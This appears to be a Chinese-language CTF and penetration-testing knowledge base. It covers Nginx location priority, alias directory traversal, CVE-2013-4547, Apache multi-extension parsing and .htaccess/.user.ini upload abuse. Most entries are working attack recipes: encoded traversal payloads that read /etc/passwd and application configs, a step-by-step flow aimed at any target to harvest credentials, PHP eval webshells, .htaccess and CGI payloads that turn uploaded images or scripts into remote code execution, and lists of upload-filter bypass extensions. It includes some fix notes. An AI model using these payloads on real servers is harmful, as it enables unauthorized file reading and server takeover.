## [g-nginx] Nginx——location 优先级、路径规范化与解析绕过
### [nginx-location] location 匹配优先级 | easy | 配置;路径匹配 | location;rewrite
> Nginx location 的匹配规则与优先级是绕路径、写配置、判解析行为的基础。
#### 这个条目的作用
拿到一个 Nginx 站点，第一件事不是猜漏洞，而是先问：「这个请求到底被哪个 location 处理了？」location 决定了一个 URI 是被当成静态文件返回、被 try_files 重写、还是被扔给 PHP-FPM 执行。所有 Nginx 相关的绕过题（解析绕过、路径穿越、前端路由坑）都能归约成「请求命中了哪个 location + 命中后发生了什么」两个问题。本条目用零基础可复现的步骤，把 5 级优先级彻底讲透。

#### 前置条件
- 一台能跑 Nginx 的机器（Docker 最省事：`docker run -d -p 8080:80 nginx`）。
- 会改配置文件并 reload：`nginx -t && nginx -s reload`。
- 会发请求：curl（Windows 下用 Git Bash 自带 curl 或 WSL）。
- 建议先把 `default.conf` 备份，改坏了能还原。

#### 第 1 步：先背下 5 级优先级（从高到低）
1. `location = /x`：精确匹配，**完全相等**才命中，命中后立即使用，不再查其他任何类型。
2. `location ^~ /x`：前缀匹配，命中后**屏蔽正则**，不再往下查 `~` / `~*`。
3. `location ~ \.php$` 与 `location ~* \.jpg$`：正则匹配，按**配置文件里的书写顺序**从上到下，第一个命中的生效；`~*` 忽略大小写。
4. 普通前缀匹配（如 `location /upload`）：在所有普通前缀里**取最长**的那个。
5. `location /`：兜底，任何没被上面命中的请求都会落在这里。

记忆口诀：先精确、再 ^~、再正则（按书写顺序）、再最长前缀、最后兜底。

#### 第 2 步：写一份包含全部类型的测试配置
在 `/etc/nginx/conf.d/test.conf`（或容器内对应路径）写入：

```nginx
server {
    listen 80;
    root /usr/share/nginx/html;

    # 用响应头标记"我命中了哪个 location"，方便肉眼判断
    add_header X-Hit "eq-exact" always;
    location = /a.txt { return 200 "EXACT"; }

    add_header X-Hit "caret" always;
    location ^~ /static/ { return 200 "CARET"; }

    location ~ \.php$    { return 200 "REGEX-PHP"; }
    location ~* \.txt$   { return 200 "REGEX-TXT"; }

    location /static/    { return 200 "PREFIX"; }   # 与 ^~ 冲突用，用来演示屏蔽
    location /upload/    { return 200 "UPLOAD"; }

    location /           { return 200 "FALLBACK"; }
}
```

注意：`add_header` 在 `return` 时不会输出，所以上面演示用 `return 200 "名字"` 返回纯文本，curl 直接看响应体就知道命中谁。这份配置同时让两个 location 匹配同一路径（`^~ /static/` 与普通前缀 `/static/`），专门用来观察优先级。

#### 第 3 步：逐个发请求，验证命中结果
```bash
curl -s http://127.0.0.1:8080/a.txt      # = 精确匹配 → EXACT
curl -s http://127.0.0.1:8080/static/a   # ^~ 屏蔽正则+前缀 → CARET
curl -s http://127.0.0.1:8080/1.php      # 正则 → REGEX-PHP
curl -s http://127.0.0.1:8080/A.TXT      # ~* 忽略大小写 → REGEX-TXT（.txt 正则只要开了 ~* 就命中大写）
curl -s http://127.0.0.1:8080/upload/a   # 普通前缀最长者 → UPLOAD
curl -s http://127.0.0.1:8080/whatever   # 谁都不沾 → FALLBACK
```

预期结果：每个请求返回体就是对应名字，与你背的优先级顺序完全一致。如果 `A.TXT` 返回的不是 REGEX-TXT，检查是不是把 `~*` 写成了 `~`。

#### 第 4 步：验证最容易踩坑的「正则 vs 前缀竞争」
把第 2 步配置里的普通前缀 `/static/` 改长成 `/static/img/`，再请求 `/static/img/1.php`：
```bash
curl -s http://127.0.0.1:8080/static/img/1.php
```
预期结果：得到 REGEX-PHP。原因：普通前缀（即使是"最长"的那个）**不会屏蔽正则**，正则永远有机会插队——只有 `^~` 才会屏蔽正则。很多人的错误认知是「前缀比正则优先级高」，这句话只在带 `^~` 时成立。

如果不行（返回了 PREFIX 之类），确认 `^~` 那一行是否还在——第 2 步配置里 `/static/` 带 `^~`，会先把正则挡掉，你要测「普通前缀 + 正则竞争」，就得把 `^~` 那行注释掉再 reload。

#### 第 5 步：验证 merge_slashes 与 try_files 的兜底行为
```nginx
location / {
    try_files $uri $uri/ /index.php?$query_string;
}
```
- 默认 `merge_slashes on`：`//etc/passwd` 会被折叠成 `/etc/passwd`，所以 `GET //index.php` 也能落到入口文件。这与「WAF 通常只看原始 URI」形成差异，可用于清洗畸形路径。
- `try_files` 的语义是「挨个找文件，找到就返回，全找不到用最后一个参数」——最后一个参数若是个 URI（不是文件），就**内部重写**到该 location。前端路由（history 模式）全靠它把不存在的路径导向 `index.php`，但它也制造了路径混淆面。

```bash
# 验证折叠：加个 access.log，看记录的是 //index.php 还是 /index.php
curl -s "http://127.0.0.1:8080//index.php"
```
预期结果：页面正常（被折叠后命中入口），日志里通常记录原始 `//index.php`。若你开了 `merge_slashes off`，`//etc/passwd` 就不再归一化，配合错误配置的 alias/root 可能产生新的穿越面（见 nginx-alias-traversal）。

#### 第 6 步：把优先级知识用于「判断解析行为」
典型场景：站点同时有 `location ~ \.php$` 和 `location /upload/`。上传 `1.png` 后请求 `/upload/1.png/x.php`：

```bash
curl -s "http://127.0.0.1:8080/upload/1.png/x.php"
```
预期结果：命中 php 正则 location。问题变成：交给 fastcgi 时 `SCRIPT_FILENAME` 到底是整个 URI 还是只取到 `.php` 那段——这取决于 `fastcgi_split_path_info`、`try_files $uri` 等后续配置。记住：**location 只决定"走哪条处理链"，真正执行不执行还看 fastcgi 参数怎么拼**。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 写了 `location /x` 却总被 `location ~ \.php$` 抢走 | 普通前缀不屏蔽正则，正则优先级本就高于普通前缀 | 想屏蔽正则必须用 `^~` |
| `location = /x` 对 `/x/` 不生效 | 精确匹配要求完全相等，尾部斜杠也算 | 需要就再写一条 `location = /x/` |
| 正则没生效 | 正则按书写顺序第一个命中即停，前面有条更宽的正则先吃了 | 把更具体的正则在配置里往上放 |
| `try_files` 最后一个参数是文件路径，请求全 404 | 兜底参数必须写成 URI（如 `/index.php`）而不是绝对路径 | 改成 `try_files $uri $uri/ /index.php?$query_string;` |
| reload 报错 | 配置语法/括号问题 | 先跑 `nginx -t` 看具体行号再改 |

#### 实战要点
- 判定请求先看命中哪个 location：`curl -i` 对比响应头（如 `X-Powered-By`、`Content-Type`）和状态码，或加 `add_header X-Hit` 自建标记。
- `^~` 命中后正则不参与，但**普通前缀 + 正则并存时正则仍可能优先**——别只按书写顺序脑补。
- `\.php$` 只匹配结尾：`/upload/1.png/x.php` 是否真被 PHP 执行，取决于 `fastcgi_split_path_info` 与 `try_files $uri`，location 命中不等于 RCE。
- `merge_slashes`（默认 on）把 `//` 折叠为 `/`，是清洗 WAF 的常见手段，也是掩盖真实路径的元凶；审计时同时看原始请求与规范化后的路径。
- 改配置必做 `nginx -t`，改完 `nginx -s reload`；靶场里改不了配置时，所有判断都靠「发请求 + 看响应差异」。

### [nginx-alias-traversal] alias 与 try_files 目录穿越 | medium | 路径穿越;配置错误 | alias;try_files
> alias 拼接路径不当可造成目录穿越；try_files 回退顺序错误可导致任意文件可读。
#### 这个条目的作用
`alias` 是 Nginx 里最容易被写错的指令：它把 location 前缀「替换」成另一个目录，拼接规则和 `root` 完全不同。写错一个斜杠，就能把 `/files/` 变成「任何目录都能读」的出入口。CTF 里经典的 `alias` 穿越题、以及真实站点里因配置疏漏导致的源码泄露，都是同一个原理。学完本条目，你能在 5 分钟内判断一个 alias 配置是否可穿越，并顺手构造出可复制的 payload。

#### 前置条件
- 一个可控的 Nginx 站点（本地 Docker 环境即可，无需靶场）。
- 有权限修改配置并 reload（`nginx -t && nginx -s reload`）。
- 会 curl，会用百分号编码（`%2e` = `.`，`%2f` = `/`）。
- 知道 Nginx 进程用户通常叫 `www-data`（决定能读到哪些文件）。

#### 第 1 步：先理解 alias 与 root 的本质区别
```nginx
location /files/ {
    alias /var/www/data/;    # alias：把 /files/ 整段"换掉"
}
location /static/ {
    root /var/www;            # root：把 /static/ 整段"接到" root 值后面
}
```
- `root /var/www` + 请求 `/static/a.txt` → 实际找 `/var/www/static/a.txt`。
- `alias /var/www/data/` + 请求 `/files/a.txt` → 实际找 `/var/www/data/a.txt`（`/files/` 被换掉）。

记忆点：**root 是把 URI 拼在最后，alias 是拿 URI 的剩余部分替换掉 location 前缀**。alias 的字面意思是「这个 location 指向别的目录」，所以拼接时最容易出斜杠问题。

#### 第 2 步：复现「越出一级目录」的最小穿越
配置：
```nginx
location /files/ {
    alias /var/www/data/;
}
```
在 `/var/www/data/` 里放一个 `hello.txt`。现在请求：

```bash
curl -i "http://127.0.0.1:8080/files/hello.txt"        # 正常：返回 data/hello.txt
curl -i --path-as-is "http://127.0.0.1:8080/files../etc/passwd"
```

预期结果：第二条约到 `/etc/passwd`（200 + root 行）。原理：请求 URI 是 `/files../etc/passwd`，**注意 `files` 后面没有斜杠**。Nginx 去掉 location 前缀 `/files` 后，剩余部分 `../etc/passwd` 直接拼到 alias 值后面得 `/var/www/data/../etc/passwd`，路径规范化后变成 `/var/www/etc/passwd`。虽然还差两级才到根，但结构已经证明「alias 拼接可控」——多叠几个 `../` 就能读全盘：

```bash
curl -i --path-as-is "http://127.0.0.1:8080/files..%2f..%2f..%2fetc%2fpasswd"
```
预期结果：`/var/www/data/../../../../etc/passwd` 规范化后 = `/etc/passwd`，返回 200 且内容完整。

如果不行（404 / 400）：检查三件事——① location 前缀是否带尾斜杠（`/files/` 与 `/files` 行为不同）；② 是否带了 `--path-as-is`（curl 默认会把客户端侧的 `..` 先规范化掉，不带这个参数你发出去的已经是干净的路径）；③ 目标文件是否在 `www-data` 可读范围（`/root/` 下的文件读不到是正常的）。

#### 第 3 步：摸清「命中条件」——这是易错点
穿越要成立，请求必须**以 location 前缀开头、但不带结尾斜杠**：
- `/files../etc/passwd` ✅ 命中穿越逻辑（前缀 `/files` 匹配，剩余 `../etc/passwd`）。
- `/files/../etc/passwd` ❌ 通常不行——`/files/`（带斜杠）匹配后剩余 `/../etc/passwd`，Nginx 在 location 匹配阶段已经把 `..` 规范化，实际变成请求 `/etc/passwd`，命中别的 location 去了。

用编码绕过一层规范化：`/files..%2f..%2f..%2fetc%2fpasswd`（`%2f` 在部分版本里不被提前规范化，进入 alias 拼接后才展开），许多靶场的出题点就在「哪一层展开、哪一层不展开」。

#### 第 4 步：检查修复方式是否正确（配置侧）
修复原则一句话：**location 前缀与 alias 结尾必须成对**（都带斜杠或都不带斜杠），或者干脆改用 root：
```nginx
# 修复 1：成对斜杠
location /files/ {
    alias /var/www/data/;      # 前缀带 /，alias 也带 /
}
# 修复 2：alias 不加尾斜杠时，前缀也不加
location /files {
    alias /var/www/data;
}
```
再回到第 2 步的 payload 测试：`/files../etc/passwd` 此时要么 404，要么按普通路径处理，不再穿越。**判断修复有没有生效，用 payload 实测而不是看配置**。

#### 第 5 步：延伸到 try_files 误用的任意文件可读
```nginx
location / {
    try_files $uri $uri/ /index.php;
}
```
这段本身没问题。但若配置写成把用户输入直接拼进 fastcgi 参数：

```nginx
location ~ \.php$ {
    fastcgi_param SCRIPT_FILENAME /var/www$fastcgi_script_name;   # 危险写法
}
```
当 `$fastcgi_script_name` 可控（配合前面学过的 location 竞争，把任意路径交进 php location），`SCRIPT_FILENAME` 就指向任意文件，PHP-FPM 找不到时可能直接把它当源码/文件处理，形成 LFI。真实靶场常见变体是 `try_files $uri /index.php;` 少写了 `$uri/` 这级目录查找，配合 autoindex 或上传点，把不该暴露的文件漏出去。

#### 第 6 步：完整验证流程（可直接套用到任何目标）
```bash
# ① 探测是否存在 alias 风格的静态目录（常见：/files/ /upload/ /static/ /images/）
# ② 不带斜杠叠 ../，看是否 200 且返回文件内容
curl -i --path-as-is "http://TARGET/files..%2f..%2f..%2fetc%2fpasswd"
# ③ 命中后读源码：猜应用路径
curl -i --path-as-is "http://TARGET/images..%2f..%2fapp%2fconfig.php"
# ④ 判断文件权限：读 /etc/passwd 成功 ≠ 能读 /root/.ssh，逐步降级目标
```
预期结果：如果 ② 返回 200 且内容是 passwd，漏洞确认；利用顺序从「读配置 → 读源码 → 找密钥/数据库凭据」推进。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 本地复现不通 | curl 把 `..` 在客户端规范化了 | 必须加 `--path-as-is` |
| 请求返回 400 Bad Request | raw `..` 或未编码的非法字符被拒绝 | 用 `%2e%2e`、`%2f` 编码后再发 |
| `files/../` 不通、`files../` 通 | 带斜杠时 location 匹配后 `..` 已被提前规范化 | 记住要点：**不带结尾斜杠**才进 alias 拼接 |
| 读 `/root/...` 404 或 403 | 文件不在 www-data 可读范围 | 降级目标：先读 `/etc/passwd`、`/var/www` 下的源码 |
| 返回 200 但是空/报错页 | 目标路径实际没那文件 | 用 payload 的穿越深度逐级试（`../` 层数 ±1） |

#### 实战要点
- alias 穿越的判定特征：`/files../x` 返回 **200 而非 404**——Nginx 认为它找到了一个"真实路径"的文件。
- `--path-as-is` 是 curl 必需参数，否则所有本地测试都会被 curl 先"修正"，给你假阴性。
- 编码分两层：`%2e`（点）与 `%2f`（斜杠）在哪一层展开决定成败；多试 `%2e%2e%2f`、`..%2f`、`%2e%2e/` 三种串。
- 命中穿越后优先读：`/etc/passwd`（验证）、应用配置（`config.php`/`.env`）、nginx 配置（可反查 alias 根目录与更多站点）。
- 修复永远是配置侧：成对斜杠或用 `root`；靶场里你改不了配置，但能靠 payload 判断它「修没修对」。
- 高版本 Nginx 对未编码 `..` 更严格，但 alias 拼接的根因（值来自配置、拼接不校验）在多数版本依旧成立，编码后照打。

### [nginx-cve-2013-4547] CVE-2013-4547 空格与空字节绕过 | medium | 解析绕过;CVE | CVE-2013-4547;%20
> Nginx 请求行解析把空格/非 ASCII 字节当分隔符，造成前后端对同一 URI 解析不一致。
#### 这个条目的作用
CVE-2013-4547 是 Nginx 历史上最经典的「解析不一致」漏洞：Nginx 在解析请求行时，把空格（`%20`）和空字节（`%00`）等字节当成分隔/终止符，于是**同一个 URL，Nginx 看到的路径和后端 PHP-FPM 看到的路径不一样**。攻击者利用这个差异，能让服务器「在磁盘上找一个带空格的文件，却以 PHP 的身份执行它」——典型结果是：你只能上传图片，却拿到 RCE。这是理解"前后端解析差异类漏洞"（Nginx 家族还有 `%0a`、`\x0b` 变体）的最佳入门样本。

#### 前置条件
- 一台**老版本** Nginx（0.8.41–1.4.3、1.5.0–1.5.6），用 Docker 拉旧镜像最省事（如 `nginx:1.4.3`），新版本已修复打不了。
- 后端是 PHP-FPM（纯静态站点不触发本漏洞，见第 6 步）。
- 一个能上传文件的 Web 应用（靶场最常见形式：只过滤扩展名的上传点）。
- curl 与基本的 HTTP 请求知识。

#### 第 1 步：理解漏洞原理（两条解析路径）
Nginx 解析请求行时，`ngx_http_parse_request_line` 会把**空格（0x20）、空字节（0x00）、0x0b 等**特殊字节当作「分隔/终止符」处理；而磁盘文件的匹配、以及后端 PHP-FPM 收到的 `SCRIPT_FILENAME`，使用的是另一套"正常路径"规则。所以：
- Nginx 查文件时，可能把 `shell.php%20` 当成磁盘上的 `shell.php_`（文件名末尾带空格的那个文件）。
- Nginx 传给 PHP-FPM 的路径却被截断成了 `shell.php`。
- PHP-FPM 看到的是 `shell.php` → 按 PHP 执行 → 文件内容被执行，即使它磁盘上的名字带空格、甚至内容是图片。

一句话记忆：**Nginx 找文件用「带空格的名字」，执行时用「截断后的名字」。**

#### 第 2 步：准备上钩的「污染文件」
需要一个磁盘上**真实存在**、文件名以空格或非法字节结尾的 PHP 文件。在靶场里通过上传点制造：

```bash
# 本地演示：直接把带空格的文件放进 web 目录（靶场则通过上传点传"shell.php "）
# 注意文件名末尾有个空格！
echo '<?php phpinfo(); ?>' > "/var/www/html/upload/shell.php "
ls -la /var/www/html/upload/
```
预期结果：目录里出现名字为 `shell.php `（含尾部空格）的文件。现实中很多上传点只检查「最后一段的扩展名」，允许你传 `shell.php `（末尾空格）或者 `shell.php%00` 之类的名字；还有些环境里你能通过 `PUT`、`MOVE` 制造这种文件。

#### 第 3 步：发送带 %20 的请求触发执行
```http
GET /upload/shell.php%20 HTTP/1.1
Host: target
```
用 curl 发送（注意 `--path-as-is`，否则 curl 会帮你处理）：
```bash
curl --path-as-is "http://target:8080/upload/shell.php%20"
```
预期结果：返回 `phpinfo()` 的输出（或你在文件里写的一句话木马的执行结果）。解析链条：Nginx 收到 `/upload/shell.php%20` → 解码后当作 `shell.php `（带空格文件）→ 命中磁盘文件 → 路径传给 FPM 时 `%20` 被当作终止符截断 → FPM 按 `shell.php` → 执行。完美错位。

如果不行：① 确认 Nginx 版本在受影响区间（`curl -i` 看 `Server` 头，或请求不存在的路径看报错页版本号）；② 确认后端是 PHP（纯静态返回 200 但内容不执行）；③ 确认上传的文件名真的带空格（`ls` 看有没有被应用改名/去空格）。

#### 第 4 步：第二变体——空字节截断
```bash
curl --path-as-is "http://target:8080/upload/xx.php%00.png"
```
预期结果：老版本 Nginx + 部分后端组合里，`%00` 被当作空字节终止，路径变成 `xx.php`，从而把 `xx.php.png` 或类似文件按 PHP 执行。注意：空字节变体比空格变体更挑版本和后端，别在 1.4.4+ 上浪费时间——那已经修了。文件侧同理，需要一个磁盘上真实存在的、能被"截断后名字"命中且内容含 PHP 的文件。

#### 第 5 步：第三变体——结合路径穿越（老靶场经典）
某些利用链组合空格与 `..`：
```bash
curl --path-as-is "http://target:8080/upload/1.gif%20/../shell.php"
```
预期结果：Nginx 解析时 `%20` 参与截断/分隔，配合 `..` 让最终路径落在 `shell.php` 上，而磁盘查找阶段找的是带空格的那个文件。这条组合比单变体更能绕过「过滤了 `%20`」的简单 WAF，但同样只对受影响版本生效。

#### 第 6 步：确认边界与修复验证
- 纯静态站点（没有 PHP-FPM/后端脚本处理）不会因本漏洞 RCE——没有执行引擎，差异再大也白搭。
- 修复：升级到 1.4.4 / 1.5.7 及以上。升级后重放第 3-5 步的 payload，预期全部返回 404 或 400——`%20` 不再被当作分隔符，文件查找与执行路径一致，漏洞关闭。

```bash
# 验证修复（升级后）：
curl --path-as-is "http://target:8080/upload/shell.php%20"
# 预期：404 Not Found（而不是之前的 phpinfo）
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 请求 404 | 版本已修复，或磁盘上没有对应带空格文件 | 先 `ls` 确认文件名，再看版本 |
| 返回 200 但不执行 | 纯静态/没有 PHP 处理 | 本漏洞只对 Nginx+PHP-FPM 组合有效 |
| 返回 400 Bad Request | 环境把畸形请求行直接拒了 | 换 `%00` 或 `\x0b` 变体；或检查是否被 WAF 拦 |
| 上传文件名失去空格 | 上传点对文件名做了 TRIM/过滤 | 用 `%20`（编码空格）提交文件名，或换 PUT/MOVE 造文件 |
| 对高版本测试无效 | 1.4.4/1.5.7 起已修复 | 换 CVE-2021-23017 等新洞，或走配置类漏洞路线 |

#### 实战要点
- 先确认组合成立：**旧版 Nginx + PHP-FPM 后端**，二者缺一不可；版本号看 `Server` 头或报错页。
- payload 三件套按命中率排序：`shell.php%20` > `xx.php%00.png` > `1.gif%20/../shell.php`，逐个试。
- 文件侧是前提：磁盘上得有「带空格/非法字节后缀」的 PHP 内容文件，上传点只验扩展名的场景最合适。
- 这类洞的本质是**解析不一致**，审计时盯「请求行里能否混入分隔符字节 + 路径穿越序列」，而不是只背 payload。
- `merge_slashes`（默认 on）会把 `//` 折叠，能清洗畸形路径，也可能掩盖此类攻击的原始样貌——审计时同时保留原始请求与规范化后路径。
- 版本修复后所有变体一键失效，遇到高版本别硬刚本 CVE，改堆其他攻击面。

## [g-apache] Apache——多后缀解析、htaccess 与路径穿越
### [apache-multi-ext] 多后缀解析 shell.php.jpg | easy | 解析绕过;文件上传 | shell.php.jpg;AddType
> Apache 从右往左按「认识的扩展名」决定处理方式，`shell.php.jpg` 是否执行取决于中间扩展名是否被识别。
#### 这个条目的作用
上传点是 CTF 和真实渗透最常见的入口，而 Apache 有一个和 Nginx 完全不同、又非常"好骗"的解析特性：**多后缀文件，从最右边的扩展名开始向左匹配**，一旦遇到「注册过的扩展名」就决定处理方式并停止。理解了这个规则，你就知道为什么 `shell.php.jpg` 有时候执行、有时候不执行、`shell.php.xxx` 反而能执行——也能在实战里只用一次上传就试出目标的"扩展名识别表"。

#### 前置条件
- 一个 Apache + PHP 的环境（靶场最常见：LAMP 一键环境、`httpd` + `mod_php`）。
- 一个允许上传文件的点（或能直接往 web 目录写测试文件）。
- 会用 curl 发送请求并看响应。

#### 第 1 步：理解「从右往左」的判定规则
Apache 的 `mod_mime` 拿到文件名后，按 `.` 从右往左切扩展名，逐个查自己的 MIME/处理器注册表：
- `shell.php.jpg`：先看 `.jpg` → 注册过（图片类型）→ 直接按图片处理，**不执行 PHP**。
- `shell.php.xxx`：先看 `.xxx` → 不认识 → 继续往左看 `.php` → 认识 → 按 PHP 处理，**执行**。
- `shell.php.`（末尾一个点）：`.` 后面是空串 → 跳过，往左看 `.php` → 执行。

所以「多后缀」不等于「必执行」——关键在于**从右往左第一个被识别的扩展名是什么**。

#### 第 2 步：写出可复现的最小测试
本地 Apache 放两个文件，内容都是 `<?php phpinfo(); ?>`：

```bash
echo '<?php phpinfo(); ?>' > /var/www/html/info.php.jpg
echo '<?php phpinfo(); ?>' > /var/www/html/info.php.xxx
echo '<?php phpinfo(); ?>' > /var/www/html/info.php.
```
然后逐个访问：
```bash
curl -s "http://127.0.0.1/info.php.jpg" ; echo
curl -s "http://127.0.0.1/info.php.xxx"; echo
curl -s "http://127.0.0.1/info.php."   ; echo
```
预期结果：
- `info.php.jpg` → 返回图片类型响应（`Content-Type: image/jpeg`，正文原样输出，phpinfo **不执行**）。
- `info.php.xxx` → 返回 PHP 输出（phpinfo 正常渲染，**执行**）。
- `info.php.` → 视版本，多数执行（或 404，取决于 Apache 对尾部点的处理）。

如果 `info.php.jpg` 也执行了，说明目标 Apache 配置把 `.jpg` 也注册给了 PHP（见第 4 步），这是配置问题而非本规则的例外。

#### 第 3 步：用它绕过"只查最后扩展名"的上传校验
靶场常见的过滤逻辑：检查上传文件**结尾**是不是 `jpg/png/gif`，或只过滤中间含 `php` 的字样。此时变体库：

```txt
shell.php.xxx        # .xxx 不认识 → 向左命中 .php → 执行
shell.php.           # 末尾点 → 实际按 .php 处理
shell.php%20         # 末尾空格（部分老版本）
shell.php.jpg.xxx    # 逐级递减，最右 .xxx 不认识
shell.phtml          # .phtml 常被注册为 PHP 且常被漏滤
shell.php3 / shell.php5 / shell.phtm
```
```bash
# 上传后用 curl 逐个验证，看哪个返回 PHP 解析结果
curl -s http://target/upload/shell.php.xxx
```
预期结果：至少 `.php.xxx` / `.php.` 之一能执行。如果全部不执行：目标把扩展名**白名单收紧**了（只收 `jpg/png` 且强制重命名为随机名），多后缀技巧失效。

#### 第 4 步：看懂背后的配置（AddType / AddHandler）
```apache
AddType application/x-httpd-php .php .phtml .php3 .php5
AddHandler application/x-httpd-php .php
```
- `AddType`：给扩展名注册 MIME 类型；`AddHandler`：给扩展名绑定处理程序。两者都会参与 `mod_mime` 的从右往左匹配。
- 上面这行把 `.phtml` `.php3` `.php5` 也注册给了 PHP——这些变体扩展名经常被过滤逻辑漏掉，是第二类绕过面。
- 若目标是 `mod_php`（古老但靶场常见），`AddHandler` 与 `SetHandler` 的优先级差异还会引出更多花活；`mod_php` 场景里 `.php` 一般直接映射到 `application/x-httpd-php`。

#### 第 5 步：探测流程（一套可复用的判断法）
```bash
# ① 上传一个内容为 phpinfo 的工具文件
# ② 依次改名验证（很多靶场允许重命名上传）
#    名字     →  期望
#    a.jpg    →  静态（对照组）
#    a.php    →  执行（对照组）
#    a.php.jpg→  静态（验证 .jpg 注册表）
#    a.php.xxx→  执行（验证 .xxx 未注册）
#    a.phtml  →  执行？（验证变体扩展名漏网）
# ③ 用响应头区分：Content-Type: image/jpeg = 被当图片；PHP 输出 = 被解析
```
`curl -i http://target/upload/a.php.xxx` 看 `Content-Type` 与响应体即可定论。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `php.jpg` 也能执行 | 配置把 `.jpg` 也注册给了 PHP | 这是配置失误，直接换 `.jpg` 马即可，别纠结规则 |
| `php.xxx` 不执行 | 目标白名单强制改名/重命名 | 多后缀这条路走不通，转 .htaccess（见 apache-htaccess-cgi） |
| 响应是 404 而非执行 | Apache 版本对尾部点/空格直接拒 | 换 `.phar`、`.phtml`、`xxx.php.` 变体 |
| 上传后文件名被应用改写 | 后端做了文件名过滤 | 用 curl 手动构造上传请求，绕过应用层直接对目录操作（如有权限） |
| 本地 mod_php 没装 | 高版本 PHP-FPM 环境行为略有差异 | 用 `.php.xxx` 验证，别依赖 `.php.jpg` 的旧版行为 |

#### 实战要点
- 判定口诀：**从右往左第一个被识别的扩展名决定处理方式**——`shell.php.jpg` 不一定执行，`shell.php.xxx` 往往能执行。
- 变体弹药库按命中率排：`shell.php.` > `shell.php.xxx` > `shell.php5/phtml/php3` > `shell.php%20`。
- 先打两个"对照组"（`a.jpg` 静态、`a.php` 执行）校准环境，再上传探测文件，别上来就赌.
- 响应头是裁判：`Content-Type: image/jpeg` = 没解析；看到 PHP 输出/`X-Powered-By: PHP` = 解析成功。
- 白名单严格时多后缀全线失效，立即切换 .htaccess（若 `AllowOverride All`）或 .user.ini 路线。
- 真实站点目标的这类问题通常是"旧配置 + 漏滤的变体扩展名"，`.phtml`/`.php5` 是最高频漏网点。

### [apache-htaccess-cgi] .htaccess 利用与 mod_cgi | medium | 配置文件;文件上传;命令执行 | htaccess;AddType;mod_cgi
> 上传 .htaccess 可改目录级配置，把图片当 PHP 解析，或开启 CGI 让任意后缀脚本直接执行。
#### 这个条目的作用
当上传点挡死了所有可疑扩展名（白名单只放 `jpg/png`），还有一条"降维打击"的路：**直接上传一个配置文件**。`.htaccess` 是 Apache 的目录级配置文件，只要目录允许它生效（`AllowOverride All`），它就能覆盖该目录的解析规则——把 `.jpg` 注册成 PHP、开启 CGI 执行任意后缀脚本，甚至把整个目录变成"执行器"。学完本条目你手里会有 4 种 .htaccess 载荷 + 1 个 .user.ini 备选方案，覆盖"上传点只验扩展名"的主流靶场。

#### 前置条件
- Apache + PHP 环境，且目标目录的 `AllowOverride` 允许 `.htaccess` 生效（靶场与老环境默认往往如此）。
- 上传点允许 `.htaccess` 这个文件名（或允许重命名上传）。
- 会用 curl、能构造 multipart 上传请求。

#### 第 1 步：先确认 .htaccess 是否真的生效
很多环境看似支持，实际 `AllowOverride None`——花十分钟验证，别把时间浪费在不生效的载荷上。

```bash
# 上传一个内容为「故意写错语法」的 .htaccess：
echo "Invalid_Directive_XYZ" > .htaccess   # 本地直接写；靶场通过上传点传
```
```bash
curl -s "http://target/upload/.htaccess" 
```
预期结果与判定：
- 访问 `.htaccess` 返回 **500 错误** → `AllowOverride` 生效（Apache 尝试解析并报错）——此路可走。
- 返回 200 且原样输出内容 → `.htaccess` **不生效**——立即转 `.user.ini`（见第 6 步）或放弃该路线。

如果不行：检查 Apache 配置里 `AllowOverride` 的值（`AllowOverride All` 才是放行），靶场改不了配置文件时就靠上面这个黑盒探测法判断。

#### 第 2 步：载荷 1——把图片当 PHP 执行（最稳）
上传两个文件：

```apache
# 文件名：.htaccess
AddType application/x-httpd-php .jpg
```
```php
// 文件名：shell.jpg，内容是 PHP
<?php @eval($_POST['c']); ?>
```
```bash
curl -s "http://target/upload/shell.jpg"            # 应返回 PHP 解析结果
curl -s -d 'c=system("id");' "http://target/upload/shell.jpg"
```
预期结果：`shell.jpg` 不再被当图片，而是按 PHP 执行，`id` 命令结果回显。原理：`.htaccess` 给 `.jpg` 注册了 PHP 处理程序，Apache 的多后缀/扩展名匹配（见 apache-multi-ext）从此把 `.jpg` 也当 PHP。

如果不行：确认第 1 步的 500 探测通过；确认上传的 `.htaccess` 没被应用改名；确认目录内没有更上层的 `.htaccess` 抢规则。

#### 第 3 步：载荷 2——覆盖更多扩展名
```apache
AddType application/x-httpd-php .png .gif .svg .webp
```
上传 `shell.png`（内容为马）访问即执行。原理同上，只是覆盖面更宽；`.svg` 在有的配置里还牵涉 XSS，可双用途。

#### 第 4 步：载荷 3——mod_cgi 开启后任意后缀直接执行命令
需要目标加载了 `mod_cgi`/`mod_cgid`（LAMP 老环境常见）。上传：

```apache
# 文件名：.htaccess
Options +ExecCGI
AddHandler cgi-script .sh
```
```bash
# 文件名：x.sh，注意第一行 shebang 必须有
#!/bin/sh
echo Content-Type: text/plain
echo
id
```
```bash
curl -s "http://target/upload/x.sh"
```
预期结果：直接返回 `id` 的输出（uid=... gid=...）。这是"文本文件直接 RCE"的路径，连 PHP 都不需要。如果 500 或 403：目标没开 ExecCGI/没加载 mod_cgi，或脚本没执行权限（`chmod +x x.sh`，上传点通常不给你设权限，必要时用别的思路）。

#### 第 5 步：载荷 4——整个目录全部按 PHP 处理
```apache
# 文件名：.htaccess
SetHandler application/x-httpd-php
```
上传后，**该目录下任何文件**（包括 `.txt`、无扩展名文件）都会被强行按 PHP 解析。适合不知道扩展名该用什么的场景，但影响面大，容易把正常文件也打坏，靶场判断"是否中招"时可以先用它。

调试技巧：`.htaccess` 里加 `AddType` 改了但没生效时，检查 Apache 错误日志（`/var/log/apache2/error.log`）——语法错误会明确告诉你哪一行不认。

#### 第 6 步：备选方案——.user.ini（无需 Apache 配合）
PHP 5.3+ 支持 `.user.ini`，即使 `AllowOverride None` 也生效（它由 PHP 自己处理，不经过 Apache 的 AllowOverride 检查）：

```ini
# 文件名：.user.ini
auto_prepend_file=shell.jpg
```
```php
// shell.jpg：一段 PHP 马
<?php @eval($_POST['c']); ?>
```
```bash
curl -s -d 'c=system("id");' "http://target/upload/index.php"   # 同目录任意 php 文件都会被预包含
```
预期结果：目标目录里任何 `.php` 文件被访问时，先自动执行 `shell.jpg` 里的代码。这招把「需要 Apache 放行 .htaccess」的前提直接绕开，适合第 1 步探测失败的环境。

#### 常见错误与排查
